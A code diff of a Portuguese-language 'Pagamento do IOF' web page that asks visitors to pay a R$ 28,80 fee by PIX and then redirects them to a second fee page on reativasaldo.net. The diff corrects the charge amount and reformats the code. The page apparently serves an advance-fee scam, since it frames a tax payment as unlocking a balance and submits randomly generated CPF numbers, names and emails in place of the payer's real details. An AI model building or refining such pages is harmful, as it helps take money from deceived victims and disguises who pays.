@@ -4,42 +4,41 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Pagamento do IOF</title>
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-ST0NVF735F"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-ST0NVF735F');
-</script> 
-<script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '727014296718099');
-fbq('track', 'PageView');
-</script>
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-ST0NVF735F"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-ST0NVF735F');
+  </script>
+  <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '727014296718099');
+    fbq('track', 'PageView');
+  </script>
   <script src="https://cdn.tailwindcss.com"></script>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     /* Estilos personalizados para alinhar ao design original */
     .custom-bg-header {
       background-color: #1E3A8A;
-      min-height: 60px; /* Altura mínima para evitar corte */
+      min-height: 60px;
       display: flex;
       align-items: center;
       justify-content: center;
-      position: fixed; /* Fixa a barra no topo */
+      position: fixed;
       top: 0;
       left: 0;
       width: 100%;
-      z-index: 1000; /* Garante que fique acima do conteúdo */
+      z-index: 1000;
     }
     .custom-bg-button {
       background-color: #1E3A8A;
@@ -66,52 +65,50 @@ fbq('track', 'PageView');
     }
     body {
       font-family: 'Inter', sans-serif;
-      margin: 0; /* Remover margens padrão do body */
+      margin: 0;
     }
     .title {
-      font-size: 20px; /* Ajuste para 20px */
+      font-size: 20px;
     }
     .description {
-      font-size: 16px; /* Ajuste para 16px */
+      font-size: 16px;
     }
     .summary h2,
     .section h3,
     .faq h2 {
-      font-size: 14px; /* Ajuste para 14px (semibold) */
-      font-weight: 600; /* Semibold */
+      font-size: 14px;
+      font-weight: 600;
     }
     .summary .total {
-      font-size: 18px; /* Ajuste para 18px */
+      font-size: 18px;
     }
     .button {
-      font-size: 16px; /* Ajuste para 16px */
+      font-size: 16px;
     }
     .faq p {
-      font-size: 14px; /* Ajuste para 14px */
-      font-weight: 500; /* Medium */
+      font-size: 14px;
+      font-weight: 500;
     }
-    /* Ênfase no input de WhatsApp */
     .whatsapp-section {
-      background-color: #A7F3D0; /* Verde mais claro para chamar atenção */
-      border: 2px solid #D1D5DB; /* Borda mais visível */
+      background-color: #A7F3D0;
+      border: 2px solid #D1D5DB;
       border-radius: 8px;
-      padding: 1.5rem; /* Aumentado para mais ênfase */
-      margin-bottom: 0.5rem; /* Reduzido para proximidade */
-      text-align: center; /* Centraliza o texto */
+      padding: 1.5rem;
+      margin-bottom: 0.5rem;
+      text-align: center;
       display: flex;
       flex-direction: column;
-      align-items: center; /* Centraliza verticalmente */
+      align-items: center;
     }
     .whatsapp-label {
-      font-size: 18px; /* Aumentado para dar ênfase */
-      font-weight: 600; /* Negrito */
-      color: #1E293B; /* Cor mais forte para contraste */
-      margin-bottom: 0.25rem; /* Reduzido para compactar */
+      font-size: 18px;
+      font-weight: 600;
+      color: #1E293B;
+      margin-bottom: 0.25rem;
     }
-    /* Ajuste para mobile */
     @media (max-width: 640px) {
       body {
-        padding: 1.5rem 1.5rem 0 1.5rem; /* Aumentado padding topo e laterais para mobile, sem padding inferior */
+        padding: 1.5rem 1.5rem 0 1.5rem;
       }
     }
     @media (min-width: 768px) {
@@ -124,9 +121,9 @@ fbq('track', 'PageView');
   </style>
 </head>
 <body class="bg-[#F9FAFB] font-inter text-gray-900 min-h-screen">
- <script>
-  fbq('trackCustom', 'IOF_View', { content_name: 'CheckoutIOF' });
-</script>
+  <script>
+    fbq('trackCustom', 'IOF_View', { content_name: 'CheckoutIOF' });
+  </script>
   <div>
     <!-- Header -->
     <div class="custom-bg-header text-white w-full">
@@ -304,14 +301,14 @@ fbq('track', 'PageView');
     document.addEventListener('DOMContentLoaded', function () {
       const botaoPagar = document.getElementById('botaoPagar');
       const pixGeneratedContainer = document.getElementById('pixGeneratedContainer');
-      const paymentCard = document.querySelector('.whatsapp-section'); // Seletor ajustado para a seção do WhatsApp
+      const paymentCard = document.querySelector('.whatsapp-section');
       const whatsappInput = document.getElementById('whatsappInput');
       const whatsappError = document.querySelector('.whatsapp-error');
       const paymentStatus = document.getElementById('paymentStatus');
       const paymentStatusGenerated = document.getElementById('paymentStatusGenerated');
 
-      const valorIOFcentavos = 600; // Atualizado para R$28,80
-      const redirectUrl = 'https://reativasaldo.net/pagamentoiof2'; // URL para redirecionamento após aprovação
+      const valorIOFcentavos = 2880; // Corrigido para R$ 28,80 (2880 centavos)
+      const redirectUrl = 'https://reativasaldo.net/pagamentoiof2';
 
       function validateWhatsAppInput() {
         const phoneValue = whatsappInput.value.trim();
@@ -331,14 +328,11 @@ fbq('track', 'PageView');
         validateWhatsAppInput();
       });
 
-      // Função para verificar o status do pagamento
       async function checkPaymentStatus(transactionId, statusElement) {
         try {
           const response = await fetch(`/pagamentoiof/api/check-payment?id=${transactionId}`, {
             method: 'GET',
-            headers: {
-              'Content-Type': 'application/json'
-            }
+            headers: { 'Content-Type': 'application/json' }
           });
           const data = await response.json();
 
@@ -349,7 +343,7 @@ fbq('track', 'PageView');
               statusElement.classList.add('text-green-600');
               setTimeout(() => {
                 window.location.href = redirectUrl;
-              }, 2000); // Redireciona após 2 segundos
+              }, 2000);
               return true;
             } else if (data.status === 'PENDING') {
               statusElement.textContent = 'Aguardando confirmação do pagamento...';
@@ -371,27 +365,24 @@ fbq('track', 'PageView');
         }
       }
 
-      // Função para iniciar polling do status do pagamento
       function startPaymentPolling(transactionId, statusElement) {
         const interval = setInterval(async () => {
           const isApproved = await checkPaymentStatus(transactionId, statusElement);
           if (isApproved) {
             clearInterval(interval);
           }
-        }, 5000); // Verifica a cada 5 segundos
+        }, 5000);
       }
 
       botaoPagar.addEventListener('click', async function(event) {
         event.preventDefault();
         const formattedPhone = validateWhatsAppInput();
-        if (!formattedPhone) {
-          return;
-        }
+        if (!formattedPhone) return;
 
         const fixedCpf = generateRandomCpf();
         const randomName = generateRandomName();
         const randomEmail = generateRandomEmail();
-        const utms = obterParametrosUTM(); // Captura UTMs da URL
+        const utms = obterParametrosUTM();
 
         botaoPagar.textContent = 'Gerando PIX...';
         botaoPagar.disabled = true;
@@ -410,25 +401,15 @@ fbq('track', 'PageView');
               tangible: false
             }
           ],
-          trackingParameters: utms // Adiciona UTMs para envio ao backend e Utmify
+          trackingParameters: utms
         };
 
         try {
-          console.log("🟢 Enviando dados para o backend:", {
-            name: randomName,
-            email: randomEmail,
-            cpf: fixedCpf,
-            phone: formattedPhone,
-            amount: valorIOFcentavos,
-            items: requestBody.items,
-            trackingParameters: utms
-          });
+          console.log("🟢 Enviando dados para o backend:", requestBody);
 
           const response = await fetch('/pagamentoiof/api/gerar-pix', {
             method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(requestBody)
           });
 
@@ -437,11 +418,8 @@ fbq('track', 'PageView');
           if (response.ok && data.pixQrCode && data.pixCode && data.transactionId) {
             paymentCard.style.display = 'none';
             pixGeneratedContainer.style.display = 'block';
-            const pixQrCodeImg = document.getElementById('pixQrCodeImg');
-            const pixCodeTextarea = document.getElementById('pixCodeTextarea');
-            pixQrCodeImg.src = data.pixQrCode;
-            pixCodeTextarea.value = data.pixCode;
-            // Inicia o polling para verificar o status do pagamento
+            document.getElementById('pixQrCodeImg').src = data.pixQrCode;
+            document.getElementById('pixCodeTextarea').value = data.pixCode;
             startPaymentPolling(data.transactionId, paymentStatusGenerated);
           } else {
             console.error('Erro retornado pelo backend ao gerar PIX:', data);
@@ -450,7 +428,7 @@ fbq('track', 'PageView');
             botaoPagar.disabled = false;
           }
         } catch (error) {
-          console.error('Erro na requisição PIX (erro de rede ou processamento do frontend):', error);
+          console.error('Erro na requisição PIX:', error);
           alert('Ocorreu um erro ao tentar gerar o PIX. Verifique sua conexão e tente novamente mais tarde.');
           botaoPagar.textContent = 'Gerar Pix Agora';
           botaoPagar.disabled = false;
@@ -458,6 +436,5 @@ fbq('track', 'PageView');
       });
     });
   </script>
-
 </body>
 </html>
